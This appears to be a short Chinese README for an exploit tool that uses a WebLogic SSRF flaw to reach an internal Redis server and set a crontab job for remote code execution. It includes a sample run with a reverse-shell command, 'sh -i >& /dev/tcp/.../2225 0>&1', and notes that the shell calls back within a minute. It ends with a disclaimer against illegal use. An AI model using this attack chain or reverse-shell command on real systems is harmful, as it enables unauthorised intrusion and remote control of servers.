# Weblogic SSRF漏洞RCE

用法：python main.py



请输入你要执行的命令:sh -i >& /dev/tcp/172.29.0.3/2225 0>&1
请输入Weblogic地址:http://127.0.0.1:7001
请输入Redis地址:http://172.29.0.2:6379
执行成功!如果是反弹shell请等待crontab执行



crontab设置的每分钟执行一次，至少一分钟才会回弹shell.

请勿用于非法测试。